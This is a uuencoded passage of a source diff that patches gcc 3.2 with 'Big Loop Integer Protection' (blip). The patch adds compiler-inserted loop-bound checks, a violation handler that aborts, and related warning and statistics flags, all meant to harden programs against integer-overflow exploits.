M(&amp;-H96-K(&amp;9O&lt;B!F;W(@;&amp;]O&lt;&#039;,@*B\-&quot;BL)3D5?5TA)3$4L&quot;2\J(&#039;=A&lt;FX@
M;F]T(&amp;5M:71I;F&lt;@8VAE8VL@9F]R(&#039;=H:6QE(&amp;QO;W!S(&quot;HO#0HK&quot;4Y%7T-!
M3$P)&quot;2\J(&#039;=A&lt;FX@;F]T(&amp;5M:71I;F&lt;@8VAE8VL@9F]R(&amp;-A;&amp;QS(&quot;HO#0HK
M?0T**V)L:7!?=V%R;FEN9W,[#0HK#0HK=&#039;EP961E9B!S=&#039;)U8W0@7VQO;W!?
M;&amp;EM:71?&lt;WL-&quot;BL)=&#039;)E92!S=&amp;UT.PD-&quot;BL)=&#039;)E92!C;W5N=&amp;5R.PT**PET
M&lt;F5E(&amp;QI;6ET.PT**PEE;G5M(&amp;QO;W!?9&amp;ER(&amp;1I&lt;CL-&quot;BL):6YT&quot;2!L:6YE
M;F\[#0HK#0HK?6QO;W!?;&amp;EM:71?&lt;SL-&quot;BL-&quot;BLO*B!B;&amp;EP(&#039;-T871I&lt;W1I
M8W,@&lt;W1R=6-T=7)E+&quot;!W:6QL(&amp;UA:6YT86EN(&#039;1H92!A;6]U;G0@;V8@96YC
M;W5T97)D(`T**R`J(&amp;-O9&amp;4@=&amp;AA=&quot;!M:6=H=&quot;!H879E(&amp;YE961E9&quot;!A(&amp;)L
M:7`@8VAE8VLL(&amp;%N9&quot;!T:&amp;4@&lt;F5A;&quot;!A;6]U;G0@;V8@#0HK(&quot;H@=&amp;EM97,@
M=&amp;AA=&quot;!A(&amp;)L:7`@8VAE8VL@=V%S(&amp;5M:71E9&quot;X@*B\-&quot;BMT&gt;7!E9&amp;5F(&#039;-T
M&lt;G5C=&quot;!?8FQI&lt;%]S=&amp;%T:7-T:6-S7W-[#0HK&quot;75N&lt;VEG;F5D(&amp;EN=`ET;W1A
M;%]C:&amp;5C:W,[#0HK&quot;75N&lt;VEG;F5D(&amp;EN=`ET;W1A;%]E;6ET&lt;SL-&quot;BL)#0HK
M&quot;75N&lt;VEG;F5D(&amp;EN=`EF;W)?8VAE8VMS.PT**PEU;G-I9VYE9&quot;!I;G0)=VAI
M;&amp;5?8VAE8VMS.PT**PEU;G-I9VYE9&quot;!I;G0)8V%L;%]C:&amp;5C:W,[#0HK&quot;0T*
M*PEU;G-I9VYE9&quot;!I;G0)9F]R7V5M:71S.PT**PEU;G-I9VYE9&quot;!I;G0)=VAI
M;&amp;5?96UI=&#039;,[#0HK&quot;75N&lt;VEG;F5D(&amp;EN=`EC86QL7V5M:71S.PT**WUB;&amp;EP
M7W-T871I&lt;W1I8W-?&lt;SL-&quot;BL-&quot;BLO*B!.54Q,(&#039;1E&lt;FUI;F%T960@;&amp;ES=&quot;!O
M9B!F=6YC=&amp;EO;B!W:&amp;EC:&quot;!A&lt;F4@86QM;W-T(&#039;1H92!S86UE(&amp;%S(&amp;$@#0HK
M(&quot;H@;&amp;]O&lt;&quot;X@:2YE(&amp;UE;6-P&gt;2P@;65M;6]V92XN(&amp;9O&lt;B!E86-H(&amp;9U;F-T
M:6]N(&#039;=E(&#039;=I;&amp;P@&lt;V%V92!T:&amp;4@#0HK(&quot;H@;F%M92!O9B!T:&amp;4@9G5N8W1I
M;VX@87,@=V5L;&quot;!A&lt;R!T:&amp;4@,&quot;!B87-E9&quot;!I;F1E&gt;&quot;!T;R!T:&amp;4@&lt;&amp;%R86T@
M#0HK(&quot;H@=VAI8V@@:7,@&lt;W5P&lt;&amp;]S92!T;R!H879E(&#039;1H92!L96YG=&amp;@@=F%R
M:6%B;&amp;4@*B\-&quot;BL-&quot;BMT&gt;7!E9&amp;5F(&#039;-T&lt;G5C=&quot;!?;&amp;]O&lt;%]L:6ME7W-[#0HK
M&quot;6-H87()&quot;0EF=6YC7VYA;65;,C4V73L-&quot;BL)=6YS:6=N960@:6YT&quot;7!A&lt;F%M
M7VEN9&amp;5X.PT**WUL;V]P7VQI:V5?&lt;SL-&quot;BL-&quot;BL-&quot;BL-&quot;BMV;VED(&amp;)L:7!?
M&lt;W1A=%]P&lt;FEN=`D)&quot;5!!4D%-4R`H*$9)3$4J*2D[#0HK#0HK8F]O;&quot;!B;&amp;EP
M7V1E8VQ?;6]D:69I960@(&quot;`@(&quot;`@(&quot;!005)!35,@*&quot;AT&lt;F5E+&#039;1R964I*3L-
M&quot;BMT&lt;F5E(&amp;)L:7!?9FEN9%]D96-L(&quot;`@(&quot;`@(&quot;`@(&quot;`@(%!!4D%-4R`H*&#039;1R
M964I*3L-&quot;BMB;V]L(&amp;)L:7!?9FEN9%]L;V]P7W9A&lt;G,@(&quot;`@(&quot;`@(%!!4D%-
M4R`H*&#039;1R964L=&#039;)E92DI.PT**V)O;VP@8FQI&lt;%]F:6YD7V-A;&amp;Q?;&amp;EM:71S
M(&quot;`@(&quot;`@4$%204U3(&quot;@H=&#039;)E92QT&lt;F5E*2D[#0HK#0HK8F]O;&quot;!B;&amp;EP7V5M
M:71?9F]R7VQO;W!?8VAE8VMS(&quot;`@(&quot;`@4$%204U3(&quot;@H=&#039;)E92DI.PT**V)O
M;VP@8FQI&lt;%]E;6ET7W=H:6QE7VQO;W!?8VAE8VMS(&quot;`@(%!!4D%-4R`H*&#039;9O
M:60I*3L-&quot;BMT&lt;F5E(&amp;)L:7!?96UI=%]C86QL7V-H96-K&lt;R`@(&quot;`@(&quot;`@(&quot;!0
M05)!35,@*&quot;AT&lt;F5E*2D[#0HK#0HK=&#039;)E92!B;&amp;EP7V)U:6QD7V-H96-K7W-T
M;70@(&quot;`@(&quot;!005)!35,@*&quot;AT&lt;F5E*2D[#0HK=&#039;)E92!B;&amp;EP7V)U:6QD7V-H
M96-K7V5X&lt;&quot;`@(&quot;`@(&quot;!005)!35,@*&quot;AT&lt;F5E*2D[#0HK=&#039;)E92!B;&amp;EP7V)U
M:6QD7W9I;VQA=&amp;EO;E]C86QL(&quot;!005)!35,@*&quot;AT&lt;F5E*2D[#0HK#0HK=&#039;)E
M92!B;&amp;EP7V-H96-K7VQO;W!?;&amp;EM:70)&quot;5!!4D%-4R`H*&#039;1R964I*3L-&quot;BMV
M;VED(&amp;)L:7!?=V%R;FEN9PD)&quot;0E005)!35,@*&quot;AE;G5M(&amp;)L:7!?=V%R;FEN
M9W,L8V]N&lt;W0@8VAA&lt;BHI*3L-&quot;F1I9F8@+4YU&lt;B!G8V,M,RXR+V=C8R]C+6]B
M:F,M8V]M;6]N+F,@9V-C+3,N,BUB;&amp;EP+V=C8R]C+6]B:F,M8V]M;6]N+F,-
M&quot;BTM+2!G8V,M,RXR+V=C8R]C+6]B:F,M8V]M;6]N+F,)5&amp;AU($UA&lt;B`R.&quot;`Q
M,#HT.3HU.&quot;`R,#`R#0HK*RL@9V-C+3,N,BUB;&amp;EP+V=C8R]C+6]B:F,M8V]M
M;6]N+F,)36]N($1E8R`@,B`Q.3HT,CHS.2`R,#`R#0I`0&quot;`M-C(L-B`K-C(L
M.2!`0`T*(&quot;`@:68@*&amp;QO;VMU&lt;%]A=&#039;1R:6)U=&amp;4@*&quot;)A;&#039;=A&gt;7-?:6YL:6YE
M(BP@1$5#3%]!5%1224)55$53(&quot;AF;BDI(&quot;$]($Y53$PI#0H@(&quot;`@(&#039;)E=&#039;5R
M;B`Q.PT*(`T**R`@:68H1$5#3%],04Y&#039;7U-014-)1DE#(&quot;AF;BD@/3T@3E5,
M3&quot;D@#0HK&quot;2`@&lt;F5T=7)N(#`[#0HK(&quot;`-&quot;B`@(&#039;)E=&#039;5R;B!$14-,7T1%0TQ!
M4D5$7TE.3$E.15]0(&quot;AF;BD@)B8@1$5#3%]%6%1%4DY!3&quot;`H9FXI.PT*(&#039;T-
M&quot;B`-&quot;F1I9F8@+4YU&lt;B!G8V,M,RXR+V=C8R]C+7!A&lt;G-E+GD@9V-C+3,N,BUB
M;&amp;EP+V=C8R]C+7!A&lt;G-E+GD-&quot;BTM+2!G8V,M,RXR+V=C8R]C+7!A&lt;G-E+GD)
M5V5D($%U9R`Q-&quot;`P,CHS,CHS-2`R,#`R#0HK*RL@9V-C+3,N,BUB;&amp;EP+V=C
M8R]C+7!A&lt;G-E+GD)36]N($1E8R`@,B`Q.3HT,CHS.2`R,#`R#0I`0&quot;`M-#8L
M-B`K-#8L-R!`0`T*(&quot;-I;F-L=61E(&quot;)O=71P=70N:&quot;(-&quot;B`C:6YC;&#039;5D92`B
M=&amp;]P;&amp;5V+F@B#0H@(VEN8VQU9&amp;4@(F=G8RYH(@T**R-I;F-L=61E(&quot;)B;&amp;EP
M+F@B#0H@(&quot;`-&quot;B`C:69D968@355,5$E&quot;651%7T-(05)3#0H@(VEN8VQU9&amp;4@
M/&amp;QO8V%L92YH/@T*0$`@+3(Q.3$L.2`K,C$Y,BPQ,&quot;!`0`T*(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;![(&quot;0T(#T@=&#039;)U=&amp;AV86QU95]C;VYV97)S:6]N(&quot;@D-&quot;D[#0H@
M&quot;0D@(&amp;-?9FEN:7-H7W=H:6QE7W-T;71?8V]N9&quot;`H=&#039;)U=&amp;AV86QU95]C;VYV
M97)S:6]N(&quot;@D-&quot;DL#0H@&quot;0D)&quot;0D@(&quot;`@)#QT=&#039;EP93XR*3L-&quot;BL)&quot;0EB;&amp;EP
M7V-H96-K7VQO;W!?;&amp;EM:70@*&quot;0\=&#039;1Y&lt;&amp;4^,BD[#0H@&quot;0D@(&quot;0\=&#039;1Y&lt;&amp;4^
M)&quot;`](&amp;%D9%]S=&amp;UT(&quot;@D/&#039;1T&gt;7!E/C(I.R!]#0H@&quot;2`@8SDY7V)L;V-K7VQI
M;F5N;U]L86)E;&amp;5D7W-T;70-&quot;BT)&quot;7L@4D5#2$%)3E]35$U44R`H)#QT=&#039;EP
M93XV+&quot;!72$E,15]&quot;3T19(&quot;@D/&#039;1T&gt;7!E/C8I*3L@?0T**PD)&gt;R!214-(04E.
M7U-43513(&quot;@D/&#039;1T&gt;7!E/C8L(%=(24Q%7T)/1%D@*&quot;0\=&#039;1Y&lt;&amp;4^-BDI.WT-
M&quot;B`)?&quot;!D;U]S=&amp;UT7W-T87)T#0H@&quot;2`@)R@G(&amp;5X&lt;&#039;(@)RDG(&quot;&lt;[)PT*(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;![($1/7T-/3D0@*&quot;0Q*2`](&#039;1R=71H=F%L=65?8V]N
M=F5R&lt;VEO;B`H)#,I.R!]#0I`0&quot;`M,C(Q,BPW(&quot;LR,C$T+#@@0$`-&quot;B`)(&quot;!X
M97AP&lt;B`G*2&lt;-&quot;B`)&quot;7L@1D]27T584%(@*&quot;0\=&#039;1Y&lt;&amp;4^,BD@/2`D.3L@?0T*
M(`D@(&amp;,Y.5]B;&amp;]C:U]L:6YE;F]?;&amp;%B96QE9%]S=&amp;UT#0HM(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&#039;L@4D5#2$%)3E]35$U44R`H)#QT=&#039;EP93XR+&quot;!&amp;3U)?0D]$62`H
M)#QT=&#039;EP93XR*2D[(&#039;T-&quot;BL@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&gt;R!214-(04E.7U-4
M3513(&quot;@D/&#039;1T&gt;7!E/C(L($9/4E]&quot;3T19(&quot;@D/&#039;1T&gt;7!E/C(I*3L-&quot;BL)&quot;0D)
M(&quot;!B;&amp;EP7V-H96-K7VQO;W!?;&amp;EM:70@*&quot;0\=&#039;1Y&lt;&amp;4^,BD[(&#039;T-&quot;B`)?&quot;!3
M5TE40T@@)R@G(&amp;5X&lt;&#039;(@)RDG#0H@&quot;0E[(&#039;-T;71?8V]U;G0K*SL-&quot;B`)&quot;2`@
M)#QT=&#039;EP93XD(#T@8U]S=&amp;%R=%]C87-E(&quot;@D,RD[(&#039;T-&quot;F1I9F8@+4YU&lt;B!G
M8V,M,RXR+V=C8R]C+71Y&lt;&amp;5C:RYC(&amp;=C8RTS+C(M8FQI&lt;&quot;]G8V,O8RUT&gt;7!E
M8VLN8PT*+2TM(&amp;=C8RTS+C(O9V-C+V,M=&#039;EP96-K+F,)5&amp;AU($UA&lt;B`R,2`Q
M-SHU,SHS.2`R,#`R#0HK*RL@9V-C+3,N,BUB;&amp;EP+V=C8R]C+71Y&lt;&amp;5C:RYC
M&quot;4UO;B!$96,@(#(@,3DZ-#(Z,SD@,C`P,@T*0$`@+30R+#8@*S0R+#&lt;@0$`-
M&quot;B`C:6YC;&#039;5D92`B:6YT;&quot;YH(@T*(&quot;-I;F-L=61E(&quot;)G9V,N:&quot;(-&quot;B`C:6YC
M;&#039;5D92`B=&amp;%R9V5T+F@B#0HK(VEN8VQU9&amp;4@(F)L:7`N:&quot;(-&quot;B`-&quot;B`O*B!.
M;VYZ97)O(&amp;EF(&#039;=E)W9E(&amp;%L&lt;F5A9&#039;D@&lt;&#039;)I;G1E9&quot;!A(&quot;)M:7-S:6YG(&amp;)R
M86-E&lt;R!A&lt;F]U;F0@:6YI=&amp;EA;&amp;EZ97(B#0H@(&quot;`@;65S&lt;V%G92!W:71H:6X@
M=&amp;AI&lt;R!I;FET:6%L:7IE&lt;BX@(&quot;HO#0I`0&quot;`M,34X-RPV(&quot;LQ-3@X+#$Q($!`
M#0H@(&quot;!44D5%7U-)1$5?149&amp;14-44R`H&lt;F5S=6QT*2`](#$[#0H@(&quot;!R97-U
M;&#039;0@/2!F;VQD(&quot;AR97-U;&#039;0I.PT*(`T**R`@+RH@8VAE8VL@=&amp;AE(&amp;YE=R!C
M&lt;F5A=&amp;5D($-!3$Q?15A04B!F;W(@8FQI&lt;&quot;!C;VYD:71I;VXN(`T**R`@(&quot;H@
M:68@8VAE8VL@8V]D92!R97%U:7)E9&quot;P@=&amp;AE($-!3$Q?15A04B!W:6QL(&amp;)E
M(&#039;)E&lt;&amp;QA8V5D(&#039;=I=&amp;@@80T**R`@(&quot;H@0T].1%]%6%!2(&amp;AA=FEN9R!T:&amp;4@
M0T%,3%]%6%!2(&amp;]N(&amp;ET&lt;R!F86QS92!S:61E+B`J+PT**R`@&lt;F5S=6QT(#T@
M8FQI&lt;%]C:&amp;5C:U]L;V]P7VQI;6ET*&#039;)E&lt;W5L=&quot;D[#0HK#0H@(&quot;!I9B`H5D])
M1%]465!%7U`@*%12145?5%E012`H&lt;F5S=6QT*2DI#0H@(&quot;`@(&#039;)E=&#039;5R;B!R
M97-U;&#039;0[#0H@(&quot;!R971U&lt;FX@&lt;F5Q=6ER95]C;VUP;&amp;5T95]T&gt;7!E(&quot;AR97-U
M;&#039;0I.PT*9&amp;EF9B`M3G5R(&amp;=C8RTS+C(O9V-C+V9L86=S+F@@9V-C+3,N,BUB
M;&amp;EP+V=C8R]F;&amp;%G&lt;RYH#0HM+2T@9V-C+3,N,B]G8V,O9FQA9W,N:`E4:&#039;4@
M36%R(#(Q(#$U.C$R.C(Q(#(P,#(-&quot;BLK*R!G8V,M,RXR+6)L:7`O9V-C+V9L
M86=S+F@)36]N($1E8R`@,B`Q.3HT,CHS.2`R,#`R#0I`0&quot;`M-C0Q+#0@*S8T
M,2PQ.2!`0`T*(&quot;\J($YO;GIE&lt;F\@;65A;G,@96YA8FQE(&#039;-Y;F-H&lt;F]N;W5S
M(&amp;5X8V5P=&amp;EO;G,@9F]R(&amp;YO;BUC86QL(&amp;EN&lt;W1R=6-T:6]N&lt;RX@(&quot;HO#0H@
M97AT97)N(&amp;EN=&quot;!F;&amp;%G7VYO;E]C86QL7V5X8V5P=&amp;EO;G,[#0H@#0HK+RH@
M3F]N&gt;F5R;R!M96%N&lt;R!P&lt;FEN=&quot;!B;&amp;EP(&#039;-T871I&lt;W1I8W,@*&amp;EF(&amp;)L:7`@
M:7,@96YA8FQE9&quot;D@*B\-&quot;BME&gt;&#039;1E&lt;FX@:6YT(&amp;9L86=?8FQI&lt;%]S=&amp;%T.PT*
M*PT**R\J($YO;GIE&lt;F\@;65A;G,@96YA8FQE(&amp;)L:7`@8VAE8VMS(&amp;9O&lt;B!L
M;V]P&lt;R!A;F0@;&amp;]O&lt;&quot;UL:6ME(&amp;-A;&amp;QS(&quot;HO#0HK97AT97)N(&amp;EN=&quot;!F;&amp;%G
M7V)L:7`[#0HK#0HK+RH@5V%R;B!W:&amp;5N(&amp;9O&lt;B!B;&amp;EP(&amp;-H96-K(&amp;-O=6QD
M(&amp;YO=&quot;!B92!E;6ET960N(&quot;`M5V)L:7!?9F]R7VYO=%]E;6ET+B`@*B\-&quot;BME
M&gt;&#039;1E&lt;FX@:6YT(&#039;=A&lt;FY?8FQI&lt;%]F;W)?;F]T7V5M:70[#0HK#0HK+RH@5V%R
M;B!W:&amp;5N(&#039;=H:6QE(&amp;)L:7`@8VAE8VL@8V]U;&amp;0@;F]T(&amp;)E(&amp;5M:71E9&quot;X@
M(&quot;U78FQI&lt;%]W:&amp;EL95]N;W1?96UI=&quot;X@(&quot;HO#0HK97AT97)N(&amp;EN=&quot;!W87)N
M7V)L:7!?=VAI;&amp;5?;F]T7V5M:70[#0HK#0HK+RH@5V%R;B!W:&amp;5N(&amp;1O(&amp;)L
M:7`@8VAE8VL@8V]U;&amp;0@;F]T(&amp;)E(&amp;5M:71E9&quot;X@(&quot;U78FQI&lt;%]C86QL7VYO
M=%]E;6ET+B`@*B\-&quot;BME&gt;&#039;1E&lt;FX@:6YT(&#039;=A&lt;FY?8FQI&lt;%]C86QL7VYO=%]E
M;6ET.PT**PT*(&quot;-E;F1I9B`O*B`A($=#0U]&amp;3$%&#039;4U]((&quot;HO#0ID:69F(&quot;U.
M=7(@9V-C+3,N,B]G8V,O;&amp;EB9V-C+7-T9&quot;YV97(@9V-C+3,N,BUB;&amp;EP+V=C
M8R]L:6)G8V,M&lt;W1D+G9E&lt;@T*+2TM(&amp;=C8RTS+C(O9V-C+VQI8F=C8RUS=&amp;0N
M=F5R&quot;5=E9&quot;!*=6X@,3,@,#&lt;Z,C8Z,#$@,C`P,0T**RLK(&amp;=C8RTS+C(M8FQI
M&lt;&quot;]G8V,O;&amp;EB9V-C+7-T9&quot;YV97()36]N($1E8R`@,B`Q.3HT,CHS.2`R,#`R
M#0I`0&quot;`M,3&lt;T+#0@*S$W-&quot;PW($!`#0H@(&quot;!?56YW:6YD7U-J3&amp;I?4F%I&lt;V5%
M&gt;&amp;-E&lt;&#039;1I;VX-&quot;B`@(%]5;G=I;F1?4VI,:E]&amp;;W)C9615;G=I;F0-&quot;B`@(%]5
M;G=I;F1?4VI,:E]297-U;64-&quot;BL-&quot;BL@(&quot;,@0FEG($QO;W`@26YT96=E&lt;B!0
M&lt;F]T96-T:6]N(&quot;AB;&amp;EP*2!H86YD;&amp;5R#0HK(&quot;!?7V)L:7!?=FEO;&amp;%T:6]N
M#0H@?0T*9&amp;EF9B`M3G5R(&amp;=C8RTS+C(O9V-C+VQI8F=C8S(N8R!G8V,M,RXR
M+6)L:7`O9V-C+VQI8F=C8S(N8PT*+2TM(&amp;=C8RTS+C(O9V-C+VQI8F=C8S(N
M8PE4=64@36%Y(#(Q(#$V.C0T.C,X(#(P,#(-&quot;BLK*R!G8V,M,RXR+6)L:7`O
M9V-C+VQI8F=C8S(N8PE-;VX@1&amp;5C(&quot;`R(#$Y.C0R.C,Y(#(P,#(-&quot;D!`(&quot;TR
M,#0Y+#,@*S(P-#DL,3$@0$`-&quot;B`C96YD:68@+RH@3D5%1%]!5$58250@*B\-
M&quot;B`-&quot;B`C96YD:68@+RH@3%]E&gt;&amp;ET(&quot;HO#0HK#0HK(VEF9&amp;5F($Q?8FQI&lt;%]V
M:6]L871I;VX-&quot;BMV;VED(%]?8FQI&lt;%]V:6]L871I;VX@*&#039;5N&lt;VEG;F5D(&amp;EN
M=&quot;!L:6UI=&quot;E[#0HK&quot;0T**PEP&lt;FEN=&amp;8H(F)L:7`@=FEO;&amp;%T:6]N(&quot;$A(2P@
M*&#039;5N&lt;VEG;F5D(&amp;EN=&quot;DE;&#039;4L(&quot;AI;G0I)61&lt;;B(L;&amp;EM:70L;&amp;EM:70I.PT*
M*PEA8F]R=&quot;@I.PT**WT-&quot;BLC96YD:68-&quot;F1I9F8@+4YU&lt;B!G8V,M,RXR+V=C
M8R]L:6)G8V,R+F@@9V-C+3,N,BUB;&amp;EP+V=C8R]L:6)G8V,R+F@-&quot;BTM+2!G
M8V,M,RXR+V=C8R]L:6)G8V,R+F@)5V5D($%U9R`R,B`P-SHS-3HR,B`R,#`Q
M#0HK*RL@9V-C+3,N,BUB;&amp;EP+V=C8R]L:6)G8V,R+F@)36]N($1E8R`@,B`Q
M.3HT,CHS.2`R,#`R#0I`0&quot;`M,C(L-B`K,C(L-R!`0`T*(&quot;-I9FYD968@1T-#
M7TQ)0D=#0S)?2`T*(&quot;-D969I;F4@1T-#7TQ)0D=#0S)?2`T*(`T**V5X=&amp;5R
M;B!V;VED(%]?8FQI&lt;%]V:6]L871I;VX@*&#039;5N&lt;VEG;F5D(&amp;EN=&quot;!L:6UI=&quot;D[
M#0H@97AT97)N(&amp;EN=&quot;!?7V=C8U]B8VUP(&quot;AC;VYS=&quot;!U;G-I9VYE9&quot;!C:&amp;%R
M(&quot;HL(&amp;-O;G-T(&#039;5N&lt;VEG;F5D(&amp;-H87(@*BP@&lt;VEZ95]T*3L-&quot;B!E&gt;&#039;1E&lt;FX@
M=F]I9&quot;!?7V-L96%R7V-A8VAE(&quot;AC:&amp;%R(&quot;HL(&amp;-H87(@*BD[#0H@97AT97)N
M(&#039;9O:60@7U]E&lt;&#039;)I;G1F(&quot;AC;VYS=&quot;!C:&amp;%R(&quot;HL(&amp;-O;G-T(&amp;-H87(@*BP@
M=6YS:6=N960@:6YT+&quot;!C;VYS=&quot;!C:&amp;%R(&quot;HI#0ID:69F(&quot;U.=7(@9V-C+3,N
M,B]G8V,O=&amp;]P;&amp;5V+F,@9V-C+3,N,BUB;&amp;EP+V=C8R]T;W!L978N8PT*+2TM
M(&amp;=C8RTS+C(O9V-C+W1O&lt;&amp;QE=BYC&quot;5-U;B!-87D@,C8@,C(Z-#@Z,34@,C`P
M,@T**RLK(&amp;=C8RTS+C(M8FQI&lt;&quot;]G8V,O=&amp;]P;&amp;5V+F,)36]N($1E8R`@,B`Q
M.3HT,CHS.2`R,#`R#0I`0&quot;`M-S`L-B`K-S`L-R!`0`T*(&quot;-I;F-L=61E(&quot;)D
M96)U9RYH(@T*(&quot;-I;F-L=61E(&quot;)T87)G970N:&quot;(-&quot;B`C:6YC;&#039;5D92`B;&amp;%N
M9VAO;VMS+F@B#0HK(VEN8VQU9&amp;4@(F)L:7`N:&quot;(-&quot;B`-&quot;B`C:68@9&amp;5F:6YE
M9&quot;`H1%=!4D8R7U5.5TE.1%])3D9/*2!\?&quot;!D969I;F5D(&quot;A$5T%21C)?1$5&quot;
M54=&#039;24Y&#039;7TE.1D\I#0H@(VEN8VQU9&amp;4@(F1W87)F,F]U=&quot;YH(@T*0$`@+3DR
M+#8@*SDS+#@@0$`-&quot;B`C:6YC;&#039;5D92`B:&amp;%L9G!I8RYH(@T*(&quot;-E;F1I9@T*
M(`P-&quot;BL-&quot;BL-&quot;B`O*B!#87)R&gt;2!I;F9O&lt;FUA=&amp;EO;B!F&lt;F]M($%335]$14-,
M05)%7T]&quot;2D5#5%].04U%#0H@(&quot;`@=&amp;\@05--7T9)3DE32%]$14-,05)%7T]&quot;
M2D5#5&quot;X@(&quot;HO#0H@#0I`0&quot;`M.#8W+#8@*S@W,&quot;PX($!`#0H@(&quot;`@1F]R(&amp;5A
M8V@@=F%R:6%B;&amp;4L(&#039;1H97)E(&amp;ES(&amp;%N(%]L;V&lt;@=F%R:6%N=&quot;!W:&amp;EC:&quot;!I
M&lt;R!T:&amp;4@&lt;&amp;]W97(-&quot;B`@(&quot;!O9B!T=V\@;F]T(&amp;QE&lt;W,@=&amp;AA;B!T:&amp;4@=F%R
M:6%B;&amp;4L(&amp;9O&lt;B`N86QI9VX@;W5T&lt;&#039;5T+B`@*B\-&quot;B`-&quot;BL-&quot;BL-&quot;B!I;G0@
M86QI9VY?;&amp;]O&lt;&#039;,[#0H@:6YT(&amp;%L:6=N7VQO;W!S7VQO9SL-&quot;B!I;G0@86QI
M9VY?;&amp;]O&lt;&#039;-?;6%X7W-K:7`[#0I`0&quot;`M.#&lt;Y+#8@*S@X-&quot;PQ-B!`0`T*(&amp;EN
M=&quot;!A;&amp;EG;E]F=6YC=&amp;EO;G,[#0H@:6YT(&amp;%L:6=N7V9U;F-T:6]N&lt;U]L;V&lt;[
M#0H@#0HK+RH@268@;VYE(&amp;5M:70@8FQI&lt;&quot;!C:&amp;5C:W,@=&amp;\@&lt;&#039;)O=&amp;5C=&quot;!F
M&lt;F]M(&#039;-O;64@:6YT96=E&lt;B!V=6QN97)A8FEL:71I97,-&quot;BL@*B!E&gt;&#039;!L;VET
M871I;VYS+B`J+PT**PT**VEN=&quot;!F;&amp;%G7V)L:7`@/2`P.PT**VEN=&quot;!F;&amp;%G
M7V)L:7!?&lt;W1A=&quot;`](#`[#0HK#0HK:6YT(&#039;=A&lt;FY?8FQI&lt;%]F;W)?;F]T7V5M
M:70@/2`P.PT**VEN=&quot;!W87)N7V)L:7!?=VAI;&amp;5?;F]T7V5M:70@/2`P.PT*
M*VEN=&quot;!W87)N7V)L:7!?8V%L;%]N;W1?96UI=&quot;`](#`[#0HK#0H@+RH@5&amp;%B
M;&amp;4@;V8@&lt;W5P&lt;&amp;]R=&amp;5D(&amp;1E8G5G9VEN9R!F;W)M871S+B`@*B\-&quot;B!S=&amp;%T
M:6,@8V]N&lt;W0@&lt;W1R=6-T#0H@&gt;PT*0$`@+3$Q-3`L-B`K,3$V-2PQ,&quot;!`0`T*
M(&quot;`@($Y?*&quot;)297!O&lt;G0@;VX@&lt;&amp;5R;6%N96YT(&amp;UE;6]R&gt;2!A;&amp;QO8V%T:6]N
M(&amp;%T(&amp;5N9&quot;!O9B!R=6XB*2!]+`T*(&quot;`@&gt;R`B=&#039;)A&lt;&#039;8B+&quot;`F9FQA9U]T&lt;F%P
M=BP@,2P-&quot;B`@(&quot;!.7R@B5&#039;)A&lt;&quot;!F;W(@&lt;VEG;F5D(&amp;]V97)F;&amp;]W(&amp;EN(&amp;%D
M9&amp;ET:6]N(&quot;\@&lt;W5B=&#039;)A8W1I;VX@+R!M=6QT:7!L:6-A=&amp;EO;B(I(&#039;TL#0HK
M(&quot;![(&quot;)B;&amp;EP(BP@)F9L86=?8FQI&lt;&quot;P@,2P-&quot;BL@(&quot;!.7R@B16UI=&quot;!&quot;:6&lt;@
M3&amp;]O&lt;&quot;!);G1E9V5R(%!R;W1E8W1I;VX@*&amp;)L:7`I(&amp;-H96-K&lt;R(I(&#039;TL#0HK
M(&quot;![(&quot;)B;&amp;EP7W-T870B+&quot;`F9FQA9U]B;&amp;EP7W-T870L(#$L#0HK(&quot;`@3E\H
M(E)E&lt;&amp;]R=&quot;!B;&amp;EP(&#039;-T871I&lt;W1I8W,B*2!]+`T*(&#039;T[#0H@#0H@+RH@5&amp;%B
M;&amp;4@;V8@;&amp;%N9W5A9V4M&lt;W!E8VEF:6,@;W!T:6]N&lt;RX@(&quot;HO#0I`0&quot;`M,30Y
M,2PW(&quot;LQ-3$P+#$S($!`#0H@(&quot;![(F1E&lt;&#039;)E8V%T960M9&amp;5C;&amp;%R871I;VYS
M(BP@)G=A&lt;FY?9&amp;5P&lt;F5C871E9%]D96-L+&quot;`Q+`T*(&quot;`@($Y?*&quot;)787)N(&amp;%B
M;W5T(&#039;5S97,@;V8@7U]A=&#039;1R:6)U=&amp;5?7R@H9&amp;5P&lt;F5C871E9&quot;DI(&amp;1E8VQA
M&lt;F%T:6]N&lt;R(I(&#039;TL#0H@(&quot;![(FUI&lt;W-I;F&lt;M;F]R971U&lt;FXB+&quot;`F=V%R;E]M
M:7-S:6YG7VYO&lt;F5T=7)N+&quot;`Q+`T*+2`@($Y?*&quot;)787)N(&amp;%B;W5T(&amp;9U;F-T
M:6]N&lt;R!W:&amp;EC:&quot;!M:6=H=&quot;!B92!C86YD:61A=&amp;5S(&amp;9O&lt;B!A=&#039;1R:6)U=&amp;4@
M;F]R971U&lt;FXB*2!]#0HK(&quot;`@3E\H(E=A&lt;FX@86)O=70@9G5N8W1I;VYS(&#039;=H
M:6-H(&amp;UI9VAT(&amp;)E(&amp;-A;F1I9&amp;%T97,@9F]R(&amp;%T=&#039;)I8G5T92!N;W)E=&#039;5R
M;B(I(&#039;TL#0HK(&quot;![(F)L:7!?9F]R7VYO=%]E;6ET(BP@)G=A&lt;FY?8FQI&lt;%]F
M;W)?;F]T7V5M:70L(#$L#0HK(&quot;`@3E\H(E=A&lt;FX@=VAE;B!B;&amp;EP(&amp;-H96-K
M(&amp;]F(&amp;9O&lt;B!L;V]P(&amp;-O=6QD(&amp;YO=&quot;!B92!E;6ET960B*2!]+`T**R`@&gt;R)B
M;&amp;EP7W=H:6QE7VYO=%]E;6ET(BP@)G=A&lt;FY?8FQI&lt;%]W:&amp;EL95]N;W1?96UI
M=&quot;P@,2P-&quot;BL@(&quot;!.7R@B5V%R;B!W:&amp;5N(&amp;)L:7`@8VAE8VL@;V8@=VAI;&amp;4@
M;&amp;]O&lt;&quot;!C;W5L9&quot;!N;W0@8F4@96UI=&amp;5D(BD@?2P-&quot;BL@(&#039;LB8FQI&lt;%]C86QL
M7VYO=%]E;6ET(BP@)G=A&lt;FY?8FQI&lt;%]C86QL7VYO=%]E;6ET+&quot;`Q+`T**R`@
